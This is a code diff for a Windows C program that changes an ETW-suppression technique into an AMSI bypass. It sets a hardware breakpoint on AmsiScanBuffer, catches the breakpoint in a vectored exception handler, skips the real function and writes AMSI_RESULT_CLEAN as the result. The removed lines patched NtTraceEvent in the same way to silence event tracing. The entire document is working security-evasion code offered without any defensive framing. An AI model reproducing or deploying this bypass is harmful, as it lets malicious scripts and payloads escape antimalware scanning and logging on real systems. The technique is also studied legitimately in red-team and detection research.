@@ -3,13 +3,25 @@
 
 #pragma warning(disable: 4334)
 
-typedef NTSTATUS( NTAPI* fnNtTraceEvent )(
-    _In_opt_ HANDLE TraceHandle,
-    _In_ ULONG Flags,
-    _In_ ULONG FieldSize,
-    _In_ PVOID Fields
+typedef enum AMSI_RESULT
+{
+    AMSI_RESULT_CLEAN = 0,
+    AMSI_RESULT_NOT_DETECTED = 1,
+    AMSI_RESULT_BLOCKED_BY_ADMIN_START = 0x4000,
+    AMSI_RESULT_BLOCKED_BY_ADMIN_END = 0x4fff,
+    AMSI_RESULT_DETECTED = 32768
+} 	AMSI_RESULT;
+
+typedef HRESULT( WINAPI* fnAmsiScanBuffer )(
+    CONTEXT      amsiContext,
+    PVOID        buffer,
+    ULONG        length,
+    LPCWSTR      contentName,
+    PVOID        amsiSession,
+    AMSI_RESULT* result
     );
-fnNtTraceEvent NtTraceEvent;
+fnAmsiScanBuffer AmsiScanBuffer;
+
 
 BOOL SetHwBp( HANDLE hThread, PVOID pAddress, DWORD regIndex ) {
 
@@ -70,16 +82,28 @@ LONG WINAPI VectoredExceptionHandler( PEXCEPTION_POINTERS pExceptionInfo ) {
 
     if ( pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP ) {
 
-        if ( pExceptionInfo->ExceptionRecord->ExceptionAddress == ( PVOID )NtTraceEvent ) {
+        if ( pExceptionInfo->ExceptionRecord->ExceptionAddress == ( PVOID )AmsiScanBuffer ) {
 
-            // PVOID retAddr = *( PVOID* )pExceptionInfo->ContextRecord->Rsp;
+            /* x64 calling convention at function entry:
+               [RSP+0x00] = Return address (8 bytes)
+               [RSP+0x08] = Shadow space for RCX (8 bytes)
+               [RSP+0x10] = Shadow space for RDX (8 bytes)
+               [RSP+0x18] = Shadow space for R8  (8 bytes)
+               [RSP+0x20] = Shadow space for R9  (8 bytes)
+               [RSP+0x28] = 5th parameter: amsiSession (8 bytes)
+               [RSP+0x30] = 6th parameter: AMSI_RESULT* (8 bytes) */
 
-            pExceptionInfo->ContextRecord->Rax = 0;
-            pExceptionInfo->ContextRecord->Rip = *( DWORD64* )pExceptionInfo->ContextRecord->Rsp;
+            PVOID retAddr = *( PVOID* )pExceptionInfo->ContextRecord->Rsp;
+
+            pExceptionInfo->ContextRecord->Rip = ( UINT_PTR )retAddr;
             pExceptionInfo->ContextRecord->Rsp += sizeof( PVOID );
+            pExceptionInfo->ContextRecord->Rax = S_OK;
 
             pExceptionInfo->ContextRecord->Dr6 &= ~0xF;
             pExceptionInfo->ContextRecord->EFlags |= 0x10000;
+
+            AMSI_RESULT* pResult = *( AMSI_RESULT** )( pExceptionInfo->ContextRecord->Rsp + 0x30 );
+            *pResult = AMSI_RESULT_CLEAN;
 
             return EXCEPTION_CONTINUE_EXECUTION;
 
@@ -93,19 +117,24 @@ LONG WINAPI VectoredExceptionHandler( PEXCEPTION_POINTERS pExceptionInfo ) {
 
 int main() {
 
-    HMODULE hNtdll = GetModuleHandleA( "ntdll.dll" );
+    HMODULE hAmsi = LoadLibraryA( "amsi.dll" );
+    if ( !hAmsi ) {
+        printf( "Failed to load amsi.dll: %d\n", GetLastError() );
+        return 1;
+    }
 
-    NtTraceEvent = ( fnNtTraceEvent )GetProcAddress( hNtdll, "NtTraceEvent" );
+    AmsiScanBuffer = ( fnAmsiScanBuffer )GetProcAddress( hAmsi, "AmsiScanBuffer" );
 
-    printf( "[+] NtTraceEvent address: %p\n", NtTraceEvent );
+
+    printf( "[+] AmsiScanBuffer address: %p\n", AmsiScanBuffer );
 
     AddVectoredExceptionHandler( 1, VectoredExceptionHandler );
 
-    SetHwBp( GetCurrentThread(), ( PVOID )NtTraceEvent, 0 );
+    SetHwBp( GetCurrentThread(), ( PVOID )AmsiScanBuffer, 0 );
 
-    printf( "[+] Breakpoint set at 0x%p\n", NtTraceEvent );
+    printf( "[+] Breakpoint set at 0x%p\n", AmsiScanBuffer );
 
-    NtTraceEvent( NULL, 0, 0, NULL );
+    // NtTraceEvent( NULL, 0, 0, NULL );
 
     system( "pause" );
 
